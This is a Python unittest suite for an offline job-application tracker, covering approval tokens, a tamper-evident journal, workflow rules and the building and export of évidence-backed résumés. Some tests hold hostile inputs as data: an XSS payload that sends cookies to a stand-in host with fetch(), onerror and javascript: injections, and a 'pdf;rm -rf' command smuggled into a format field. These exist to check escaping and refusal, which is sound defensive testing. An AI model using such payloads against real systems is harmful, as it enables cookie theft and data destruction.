import json
import tempfile
import unittest
from pathlib import Path

import _bootstrap  # noqa: F401
from ct_applications import approvals as ap
from ct_applications import schema, synthetic
from ct_applications.core import FixedClock, ValidationError, clean_text, parse_ts
from ct_applications.events import ApplicationStore, CorrectionError, ReplayError, submission_package_hash
from ct_applications.journal import IntegrityError, Journal
from ct_applications.resume import (MANUAL_WARNING, MissingProofError, ResumeEngine, ResumeError,
                                    StaleEvidenceError)
from ct_applications.workflow import WorkflowError


def grant(ledger, action, subject, digest, **kw):
    return ledger.grant(action=action, subject_id=subject, content_hash=digest, actor="user",
                        confirmation=ap.expected_confirmation(action, subject, digest), **kw)["token_id"]


class Env:
    """One wired-up offline workspace."""

    def __init__(self, root=None):
        self.clock = FixedClock("2026-02-01T10:00:00Z")
        p = (lambda n: Path(root) / n) if root else (lambda n: None)
        self.ledger = ap.ApprovalLedger(p("approvals.jsonl"), clock=self.clock)
        self.resumes = ResumeEngine(p("variants.jsonl"), clock=self.clock, approvals=self.ledger)
        self.store = ApplicationStore(p("applications.jsonl"), clock=self.clock, approvals=self.ledger,
                                      variant_hash=self.resumes.content_hash_of)
        self.job = synthetic.job()
        self.claims = synthetic.claims()

    def variant(self, **kw):
        return self.resumes.build_variant(subject_id=synthetic.SUBJECT, job=self.job, claims=self.claims, **kw)

    def to_approved(self, app="app-1", employer="emp-fictional-meridian", experiment_id=None):
        v = self.variant()
        self.store.open_application(application_id=app, job_id=self.job["id"], employer_id=employer)
        self.store.append_event(application_id=app, job_id=self.job["id"], event_type="drafted", actor="system",
                                source="system:resume-engine", outcome_status="observed",
                                resume_variant_id=v["id"], experiment_id=experiment_id)
        pkg = submission_package_hash(app, self.job["id"], v["id"], v["content_hash"])
        tok = grant(self.ledger, ap.SUBMIT_APPLICATION, app, pkg)
        self.store.append_event(application_id=app, job_id=self.job["id"], event_type="approved", actor="user",
                                source="user:approval-dialog", outcome_status="observed",
                                resume_variant_id=v["id"], approval_token_ref=tok, experiment_id=experiment_id)
        return v, tok


class TestSchema(unittest.TestCase):
    def test_contract_event_valid_and_invalid(self):
        good = {"id": "e", "application_id": "a", "job_id": "j", "event_type": "saved",
                "recorded_at": "2026-01-01T00:00:00Z", "actor": "user", "source": "s", "outcome_status": "observed"}
        schema.validate(good, "application-event")
        for bad in ({**good, "event_type": "auto_applied"}, {**good, "extra": 1},
                    {**good, "recorded_at": "yesterday"}, {k: v for k, v in good.items() if k != "actor"},
                    {**good, "occurred_at": 5}):
            with self.assertRaises(ValidationError):
                schema.validate(bad, "application-event")

    def test_unknown_schema_keyword_is_refused(self):
        with self.assertRaises(ValidationError):
            schema.errors("x", {"type": "string", "pattern": "^a"})

    def test_cross_check_against_jsonschema_if_installed(self):
        try:
            import jsonschema
        except ImportError:
            self.skipTest("jsonschema not installed; lane B checker is the only validator")
        cases = [synthetic.job(), {**synthetic.job(), "status": "bogus"}, {**synthetic.job(), "skills": ["a", "a"]},
                 synthetic.claims()[0], {**synthetic.claims()[0], "visibility": "world"}, {"id": 1}]
        for name in ("job-posting", "profile-claim", "application-event", "experiment"):
            validator = jsonschema.Draft202012Validator(schema.load_contract(name))
            for case in cases:
                self.assertEqual(not schema.errors(case, schema.load_contract(name)), validator.is_valid(case), (name, case))

    def test_timestamps_must_carry_offset(self):
        self.assertEqual(parse_ts("2026-01-01T02:00:00+02:00"), parse_ts("2026-01-01T00:00:00Z"))
        for bad in ("2026-01-01T00:00:00", "2026-01-01", "2026-13-01T00:00:00Z", 5):
            with self.assertRaises(ValidationError):
                parse_ts(bad)


class TestJournal(unittest.TestCase):
    def test_tamper_reorder_delete_truncate_detected(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "j.jsonl"
            j = Journal(path)
            for i in range(4):
                j.append("k", {"i": i}, "2026-01-01T00:00:00Z")
            anchor = j.anchor()
            lines = path.read_text(encoding="utf-8").splitlines()
            self.assertTrue(Journal(path).verify(anchor["head"], anchor["length"]))

            def reload(new_lines):
                path.write_text("\n".join(new_lines) + "\n", encoding="utf-8")
                return Journal(path)

            edited = lines[:]
            edited[1] = edited[1].replace('"i":1', '"i":99')
            for mutation in (edited, [lines[1], lines[0]] + lines[2:], lines[:1] + lines[2:], ["{not json"]):
                with self.assertRaises(IntegrityError):
                    reload(mutation)
            truncated = reload(lines[:2])  # tail truncation: chain is intact...
            with self.assertRaises(IntegrityError):  # ...but the anchor exposes it
                truncated.verify(anchor["head"], anchor["length"])

    def test_reads_cannot_mutate_state(self):
        j = Journal()
        j.append("k", {"nested": {"a": 1}}, "2026-01-01T00:00:00Z")
        next(iter(j))["body"]["nested"]["a"] = 2
        self.assertEqual(next(iter(j))["body"]["nested"]["a"], 1)
        j.verify()


class TestApprovals(unittest.TestCase):
    def setUp(self):
        self.clock = FixedClock("2026-02-01T10:00:00Z")
        self.ledger = ap.ApprovalLedger(clock=self.clock)
        self.h = "a" * 64

    def test_only_user_with_exact_confirmation(self):
        for actor in ("system", "import", "admin", ""):
            with self.assertRaises(ap.ApprovalError):
                self.ledger.grant(action=ap.EXPORT_RESUME, subject_id="rv-1", content_hash=self.h, actor=actor,
                                  confirmation=ap.expected_confirmation(ap.EXPORT_RESUME, "rv-1", self.h))
        with self.assertRaises(ap.ApprovalError):
            self.ledger.grant(action=ap.EXPORT_RESUME, subject_id="rv-1", content_hash=self.h, actor="user",
                              confirmation="yes")
        with self.assertRaises(ap.ApprovalError):
            grant(self.ledger, "auto_apply", "rv-1", self.h)

    def test_single_use_binding_expiry_revocation(self):
        tok = grant(self.ledger, ap.EXPORT_RESUME, "rv-1", self.h)
        kw = dict(action=ap.EXPORT_RESUME, subject_id="rv-1", content_hash=self.h, used_for="t")
        for wrong in ({**kw, "content_hash": "b" * 64}, {**kw, "subject_id": "rv-2"},
                      {**kw, "action": ap.SUBMIT_APPLICATION}):
            with self.assertRaises(ap.ApprovalError):
                self.ledger.consume(tok, **wrong)
        for missing in (None, "apr-does-not-exist", 7):
            with self.assertRaises(ap.ApprovalError):
                self.ledger.consume(missing, **kw)
        self.ledger.consume(tok, **kw)
        with self.assertRaises(ap.ApprovalError):  # replay
            self.ledger.consume(tok, **kw)
        tok2 = grant(self.ledger, ap.EXPORT_RESUME, "rv-1", self.h, ttl_hours=1)
        self.clock.advance(hours=2)
        with self.assertRaises(ap.ApprovalError):
            self.ledger.consume(tok2, **kw)
        self.assertEqual(self.ledger.status(tok2), "expired")
        tok3 = grant(self.ledger, ap.EXPORT_RESUME, "rv-1", self.h)
        with self.assertRaises(ap.ApprovalError):
            self.ledger.revoke(tok3, actor="system")
        self.ledger.revoke(tok3, actor="user")
        with self.assertRaises(ap.ApprovalError):
            self.ledger.consume(tok3, **kw)
        with self.assertRaises(ap.ApprovalError):
            grant(self.ledger, ap.EXPORT_RESUME, "rv-1", self.h, ttl_hours=10_000)

    def test_state_survives_reload(self):
        with tempfile.TemporaryDirectory() as d:
            ledger = ap.ApprovalLedger(Path(d) / "a.jsonl", clock=self.clock)
            tok = grant(ledger, ap.EXPORT_RESUME, "rv-1", self.h)
            ledger.consume(tok, action=ap.EXPORT_RESUME, subject_id="rv-1", content_hash=self.h, used_for="t")
            again = ap.ApprovalLedger(Path(d) / "a.jsonl", clock=self.clock)
            self.assertEqual(again.status(tok), "consumed")


class TestWorkflowAndStore(unittest.TestCase):
    def setUp(self):
        self.env = Env()
        self.s = self.env.store
        self.jid = self.env.job["id"]

    def ev(self, kind, app="app-1", actor="user", **kw):
        kw.setdefault("source", f"{actor}:test")
        kw.setdefault("outcome_status", "self-reported")
        return self.s.append_event(application_id=app, job_id=self.jid, event_type=kind, actor=actor, **kw)

    def test_happy_path_is_attributable_and_contract_valid(self):
        v, tok = self.env.to_approved()
        self.env.clock.advance(hours=1)
        sub = self.s.record_user_submission(application_id="app-1")
        self.assertEqual((sub["actor"], sub["outcome_status"], sub["approval_token_ref"]), ("user", "self-reported", tok))
        self.ev("recruiter_screen", actor="import", source="import:fixture-mail-1", outcome_status="observed")
        self.ev("interview")
        self.ev("interview")  # second round
        self.ev("offer")
        proj = self.s.projection("app-1")
        self.assertEqual(proj["stage"], "offer")
        self.assertEqual(proj["resume_variant_id"], v["id"])
        self.assertEqual(proj["employer_id"], "emp-fictional-meridian")
        for e in self.s.raw_events("app-1"):
            schema.validate(e, "application-event")
            self.assertTrue(e["actor"] and e["source"] and e["recorded_at"])

    def test_illegal_transitions(self):
        with self.assertRaises(WorkflowError):  # must be opened first
            self.ev("drafted")
        with self.assertRaises(WorkflowError):  # saved needs employer link
            self.ev("saved")
        self.s.open_application(application_id="app-1", job_id=self.jid, employer_id="emp-1")
        for kind in ("submitted", "approved", "interview", "offer", "rejected", "saved"):
            with self.assertRaises(WorkflowError, msg=kind):
                self.ev(kind)
        with self.assertRaises(WorkflowError):  # job link immutable
            self.s.append_event(application_id="app-1", job_id="fake-other", event_type="drafted", actor="user",
                                source="t", outcome_status="observed")
        self.ev("withdrawn")
        for kind in ("drafted", "submitted", "withdrawn"):
            with self.assertRaises(WorkflowError):
                self.ev(kind)
        self.ev("note", notes="terminal applications still accept notes")

    def test_system_and_import_cannot_approve_or_submit(self):
        v = self.env.variant()
        self.s.open_application(application_id="app-1", job_id=self.jid, employer_id="emp-1")
        self.ev("drafted", actor="system", resume_variant_id=v["id"])
        for actor in ("system", "import"):
            for kind in ("approved", "submitted", "withdrawn"):
                with self.assertRaises(WorkflowError, msg=(actor, kind)):
                    self.ev(kind, actor=actor, resume_variant_id=v["id"])
        with self.assertRaises(ap.ApprovalError):  # user, but no token
            self.ev("approved", resume_variant_id=v["id"])
        with self.assertRaises(ValidationError):  # actor outside the contract
            self.ev("note", actor="recruiter-bot")

    def test_submission_requires_matching_approval(self):
        v, tok = self.env.to_approved()
        other = self.env.resumes.revise(v["id"], remove_claim_ids=["claim-sec"])
        with self.assertRaises(WorkflowError):  # different résumé than approved
            self.ev("submitted", resume_variant_id=other["id"], approval_token_ref=tok)
        with self.assertRaises(WorkflowError):  # wrong token
            self.ev("submitted", resume_variant_id=v["id"], approval_token_ref="apr-forged")
        with self.assertRaises(WorkflowError):  # cannot be claimed as externally observed
            self.ev("submitted", resume_variant_id=v["id"], approval_token_ref=tok, outcome_status="observed")
        self.s.record_user_submission(application_id="app-1")

    def test_approval_token_cannot_be_reused_for_another_application(self):
        v, tok = self.env.to_approved("app-1")
        self.s.open_application(application_id="app-2", job_id=self.jid, employer_id="emp-2")
        self.ev("drafted", app="app-2", resume_variant_id=v["id"])
        with self.assertRaises(ap.ApprovalError):
            self.ev("approved", app="app-2", resume_variant_id=v["id"], approval_token_ref=tok)

    def test_redraft_after_approval_needs_fresh_approval(self):
        v, tok = self.env.to_approved()
        self.ev("drafted", resume_variant_id=v["id"])
        with self.assertRaises(ap.ApprovalError):  # old token was consumed
            self.ev("approved", resume_variant_id=v["id"], approval_token_ref=tok)
        with self.assertRaises(WorkflowError):
            self.s.record_user_submission(application_id="app-1")

    def test_replay_and_duplicate_imports(self):
        self.env.to_approved()
        self.s.record_user_submission(application_id="app-1")
        first = self.ev("recruiter_screen", actor="import", source="import:msg-42", outcome_status="observed",
                        occurred_at="2026-02-01T09:00:00Z", event_id="evt-mail-42")
        with self.assertRaises(ReplayError):  # same event id replayed
            self.ev("interview", event_id=first["id"])
        with self.assertRaises(ReplayError):  # same mail imported twice
            self.ev("recruiter_screen", actor="import", source="import:msg-42", outcome_status="observed",
                    occurred_at="2026-02-01T09:00:00Z")
        n = len(self.s.raw_events("app-1"))
        self.assertIsNone(self.ev("recruiter_screen", actor="import", source="import:msg-42",
                                  outcome_status="observed", occurred_at="2026-02-01T09:00:00Z",
                                  on_duplicate="ignore"))
        self.assertEqual(len(self.s.raw_events("app-1")), n)
        self.assertEqual(self.s.duplicates_ignored, 1)

    def test_future_occurred_at_refused(self):
        self.s.open_application(application_id="app-1", job_id=self.jid, employer_id="emp-1")
        with self.assertRaises(ValidationError):
            self.ev("drafted", occurred_at="2030-01-01T00:00:00Z")

    def test_corrections_void_and_amend(self):
        self.env.to_approved()
        self.s.record_user_submission(application_id="app-1")
        rej = self.ev("rejected", notes="misread email")
        self.assertTrue(self.s.projection("app-1")["terminal"])
        with self.assertRaises(CorrectionError):
            self.s.correct_event(target_event_id=rej["id"], action="void", reason="x", actor="system")
        with self.assertRaises(CorrectionError):
            self.s.correct_event(target_event_id=rej["id"], action="void", reason="")
        corr = self.s.correct_event(target_event_id=rej["id"], action="void", reason="it was a different posting")
        schema.validate(corr, "application-event")
        proj = self.s.projection("app-1")
        self.assertEqual((proj["stage"], proj["voided_event_ids"]), ("submitted", [rej["id"]]))
        self.assertIn(rej["id"], [e["id"] for e in self.s.raw_events("app-1")])  # nothing deleted
        with self.assertRaises(CorrectionError):  # double void
            self.s.correct_event(target_event_id=rej["id"], action="void", reason="again")
        with self.assertRaises(CorrectionError):  # correcting a correction
            self.s.correct_event(target_event_id=corr["id"], action="void", reason="undo")
        screen = self.ev("recruiter_screen")
        self.s.correct_event(target_event_id=screen["id"], action="amend", reason="wrong date",
                             changes={"occurred_at": "2026-01-30T15:00:00Z"})
        self.assertEqual(self.s.projection("app-1")["milestones"]["recruiter_screen"], "2026-01-30T15:00:00Z")
        for changes in ({"event_type": "offer"}, {"actor": "system"}, {"occurred_at": "2031-01-01T00:00:00Z"}, {}):
            with self.assertRaises(CorrectionError, msg=changes):
                self.s.correct_event(target_event_id=screen["id"], action="amend", reason="r", changes=changes)

    def test_void_that_breaks_history_is_refused(self):
        self.env.to_approved()
        sub = self.s.record_user_submission(application_id="app-1")
        self.ev("recruiter_screen")
        with self.assertRaises(CorrectionError):  # screen without a submission is impossible
            self.s.correct_event(target_event_id=sub["id"], action="void", reason="oops")
        saved = self.s.raw_events("app-1")[0]
        with self.assertRaises(CorrectionError):
            self.s.correct_event(target_event_id=saved["id"], action="void", reason="oops")

    def test_experiment_link_cannot_cross_over(self):
        self.env.to_approved(experiment_id="exp-1")
        with self.assertRaises(WorkflowError):
            self.ev("note", experiment_id="exp-2")
        self.env.to_approved("app-2")
        self.s.record_user_submission(application_id="app-2")
        with self.assertRaises(WorkflowError):  # cannot attach after exposure
            self.ev("note", app="app-2", experiment_id="exp-1")

    def test_historical_imports_are_flagged_and_barred_from_experiments(self):
        with self.assertRaises(WorkflowError):
            self.s.open_application(application_id="h-1", job_id=self.jid, employer_id="emp-9", historical=True)
        with self.assertRaises(WorkflowError):
            self.s.open_application(application_id="h-1", job_id=self.jid, employer_id="emp-9", actor="import")
        self.s.open_application(application_id="h-1", job_id=self.jid, employer_id="emp-9", actor="import",
                                source="import:synthetic-history", historical=True)
        for kind in ("drafted", "approved", "submitted", "rejected"):
            self.ev(kind, app="h-1", actor="import", source=f"import:hist-{kind}", outcome_status="self-reported")
        proj = self.s.projection("h-1")
        self.assertTrue(proj["historical"] and proj["stage"] == "rejected")
        with self.assertRaises(WorkflowError):
            self.ev("note", app="h-1", experiment_id="exp-1")

    def test_lifecycle_flags_never_invent_a_rejection(self):
        self.env.to_approved()
        self.s.record_user_submission(application_id="app-1")
        self.env.clock.advance(days=60)
        proj = self.s.projection("app-1")
        self.assertEqual(proj["stage"], "submitted")
        self.assertIn("no_response_outcome_unknown", proj["lifecycle_flags"])
        self.assertIsNone(proj["milestones"]["rejected"])
        self.env.clock.advance(days=400)
        self.assertIn("retention_review_due", self.s.projection("app-1")["lifecycle_flags"])

    def test_durable_reload_and_on_disk_tamper(self):
        with tempfile.TemporaryDirectory() as d:
            env = Env(d)
            env.to_approved()
            env.store.record_user_submission(application_id="app-1")
            before = env.store.projection("app-1")
            again = Env(d)
            self.assertEqual(again.store.projection("app-1"), before)
            path = Path(d) / "applications.jsonl"
            path.write_text(path.read_text(encoding="utf-8").replace('"submitted"', '"offer"'), encoding="utf-8")
            with self.assertRaises(IntegrityError):
                Env(d)

    def test_hostile_text_is_stored_inert(self):
        self.s.open_application(application_id="app-1", job_id=self.jid, employer_id="emp-1")
        ev = self.ev("note", notes="<script>alert(1)</script>\x00‮ hidden")
        self.assertNotIn("\x00", ev["notes"])
        self.assertNotIn("‮", ev["notes"])
        with self.assertRaises(ValidationError):
            self.ev("note", notes="x" * 5000)
        with self.assertRaises(ValidationError):
            self.s.open_application(application_id="app\x00-2", job_id=self.jid, employer_id="emp-1")
        self.assertEqual(clean_text("  a\x07b  "), "ab")


class TestResume(unittest.TestCase):
    def setUp(self):
        self.env = Env()
        self.r = self.env.resumes

    def test_only_backed_claims_are_selected(self):
        v = self.env.variant()
        ids = {b["claim_id"] for b in v["bullets"]}
        self.assertEqual(ids, {"claim-api", "claim-eval", "claim-aws", "claim-ts", "claim-sec"})
        refused = {r["claim_id"]: r["reason"] for r in v["refused_claims"]}
        self.assertEqual(refused, {"claim-mlops": "unverified", "claim-sales": "contradicted_by_evidence",
                                   "claim-private": "private_visibility", "claim-old": "expired",
                                   "claim-noev": "supported_without_evidence"})
        self.assertEqual(v["unproven_requirements"], ["customer-delivery"])
        texts = {c["id"]: c["claim_text"] for c in self.env.claims}
        for b in v["bullets"]:  # verbatim: nothing invented or paraphrased
            self.assertEqual(b["text"], texts[b["claim_id"]])
            self.assertTrue(b["evidence_ids"] or b["claim_status"] == "self-reported")
        self.assertTrue(any(w.startswith("SELF_REPORTED") for w in v["warnings"]))
        self.assertTrue(any(w.startswith("UNPROVEN_REQUIREMENTS") for w in v["warnings"]))

    def test_missing_proof_is_refused(self):
        for skill in ("mlops", "enterprise-sales", "customer-delivery", "quantum-basket-weaving"):
            with self.assertRaises(MissingProofError, msg=skill):
                self.env.variant(must_cover_skills=[skill])
        with self.assertRaises(MissingProofError):
            self.r.build_variant(subject_id=synthetic.SUBJECT, job=self.env.job, claims=self.env.claims[5:7])
        with self.assertRaises(MissingProofError):  # someone else's claims
            self.r.build_variant(subject_id="candidate-other", job=self.env.job, claims=self.env.claims)
        v = self.env.variant(include_self_reported=False)
        self.assertNotIn("claim-ts", {b["claim_id"] for b in v["bullets"]})
        with self.assertRaises(ValidationError):  # malformed claim
            self.r.build_variant(subject_id=synthetic.SUBJECT, job=self.env.job, claims=[{"id": "x"}])

    def test_versions_are_immutable_and_diffable(self):
        v1 = self.env.variant()
        v2 = self.r.revise(v1["id"], remove_claim_ids=["claim-sec"], change_note="tighten")
        self.assertEqual((v2["version"], v2["parent_id"], v2["lineage_id"]), (2, v1["id"], v1["id"]))
        self.assertEqual(self.r.get(v1["id"]), v1)  # old version untouched
        d = self.r.diff(v1["id"], v2["id"])
        self.assertEqual([b["claim_id"] for b in d["removed"]], ["claim-sec"])
        self.assertEqual((d["added"], d["text_changed"]), ([], []))
        with self.assertRaises(ResumeError):  # must branch from the head
            self.r.revise(v1["id"], remove_claim_ids=["claim-aws"])
        with self.assertRaises(MissingProofError):  # cannot add a refused claim
            self.r.revise(v2["id"], claims=self.env.claims, add_claim_ids=["claim-sales"])
        with self.assertRaises(MissingProofError):  # cannot add a claim that was not supplied
            self.r.revise(v2["id"], add_claim_ids=["claim-imaginary"])
        self.assertEqual(self.env.variant()["id"], v1["id"])  # same content, same id
        self.assertEqual([v["version"] for v in self.r.lineage(v2["id"])], [1, 2])

    def test_manual_overwrite_is_flagged_everywhere(self):
        v1 = self.env.variant()
        with self.assertRaises(ResumeError):
            self.r.manual_overwrite(v1["id"], claim_id="claim-api", new_text="x", actor="system")
        v2 = self.r.manual_overwrite(v1["id"], claim_id="claim-api", new_text="Invented a time machine", actor="user")
        self.assertIn(MANUAL_WARNING, v2["warnings"])
        self.assertNotEqual(v2["content_hash"], v1["content_hash"])
        d = self.r.diff(v1["id"], v2["id"])
        self.assertTrue(d["text_changed"][0]["manual_override"])
        tok = grant(self.env.ledger, ap.EXPORT_RESUME, v2["id"], v2["content_hash"])
        out = self.r.export(v2["id"], fmt="txt", token_id=tok, current_claims=self.env.claims)
        self.assertIn(MANUAL_WARNING, out["warnings"])

    def test_export_is_gated_bound_and_single_use(self):
        v1 = self.env.variant()
        with self.assertRaises(ap.ApprovalError):
            self.r.export(v1["id"], fmt="txt", token_id=None, current_claims=self.env.claims)
        tok = grant(self.env.ledger, ap.EXPORT_RESUME, v1["id"], v1["content_hash"])
        v2 = self.r.manual_overwrite(v1["id"], claim_id="claim-api", new_text="changed after approval", actor="user")
        with self.assertRaises(ap.ApprovalError):  # approval does not carry over to edited content
            self.r.export(v2["id"], fmt="txt", token_id=tok, current_claims=self.env.claims)
        with tempfile.TemporaryDirectory() as d:
            out = self.r.export(v1["id"], fmt="html", token_id=tok, current_claims=self.env.claims, dest_dir=d)
            self.assertEqual(Path(out["path"]).parent, Path(d))
            self.assertEqual(Path(out["path"]).read_text(encoding="utf-8"), out["document"])
        with self.assertRaises(ap.ApprovalError):  # replay
            self.r.export(v1["id"], fmt="txt", token_id=tok, current_claims=self.env.claims)
        self.assertEqual(len(self.r.exports), 1)
        self.assertEqual(ResumeEngine(clock=self.env.clock).exports, [])  # no ledger -> cannot export at all
        with self.assertRaises(ap.ApprovalError):
            ResumeEngine(clock=self.env.clock).export("rv-x", fmt="txt", token_id=tok, current_claims=[])

    def test_export_refused_when_evidence_goes_stale(self):
        v = self.env.variant()
        for mutate in (lambda c: c.update(status="contradicted"),
                       lambda c: c.update(claim_text="Quietly inflated text"),
                       lambda c: c.update(evidence_ids=[]),
                       lambda c: c.update(visibility="private")):
            claims = json.loads(json.dumps(self.env.claims))
            mutate(claims[0])
            tok = grant(self.env.ledger, ap.EXPORT_RESUME, v["id"], v["content_hash"])
            with self.assertRaises(StaleEvidenceError):
                self.r.export(v["id"], fmt="txt", token_id=tok, current_claims=claims)
            self.assertEqual(self.env.ledger.status(tok), "active")  # refusal does not burn the approval
        tok = grant(self.env.ledger, ap.EXPORT_RESUME, v["id"], v["content_hash"])
        with self.assertRaises(StaleEvidenceError):  # claim deleted
            self.r.export(v["id"], fmt="txt", token_id=tok, current_claims=self.env.claims[1:])

    def test_malicious_markup_is_escaped_in_every_rendering(self):
        evil = '<script>fetch("https://evil.invalid/"+document.cookie)</script><img src=x onerror=alert(1)> [x](javascript:alert(1))'
        claims = self.env.claims + [synthetic.claim("claim-evil", evil, skills=["python", "api-design", "typescript"])]
        job = {**self.env.job, "title": "<iframe src=//evil.invalid>", "skills": ["python", "<b>bold</b>"]}
        v = self.r.build_variant(subject_id=synthetic.SUBJECT, job=job, claims=claims, emphasize_skills=["python"])
        bullet = next(b for b in v["bullets"] if b["claim_id"] == "claim-evil")
        self.assertTrue(bullet["contains_markup_like_text"])
        html_doc, md_doc = self.r.render(v["id"], "html"), self.r.render(v["id"], "md")
        for doc in (html_doc, md_doc):
            for needle in ("<script", "<img", "<iframe", "<b>"):
                self.assertNotIn(needle, doc)
        self.assertIn("&lt;script&gt;", html_doc)
        self.assertNotIn("](javascript:", md_doc)
        self.assertEqual(html_doc.count("<li>"), len(v["bullets"]))
        with self.assertRaises(ResumeError):
            self.r.render(v["id"], "pdf;rm -rf")

    def test_variants_survive_reload_and_tamper_is_detected(self):
        with tempfile.TemporaryDirectory() as d:
            env = Env(d)
            v = env.variant()
            self.assertEqual(Env(d).resumes.get(v["id"]), v)
            path = Path(d) / "variants.jsonl"
            path.write_text(path.read_text(encoding="utf-8").replace("fictional partner API", "real NASA API"),
                            encoding="utf-8")
            with self.assertRaises(IntegrityError):
                Env(d)


if __name__ == "__main__":
    unittest.main()
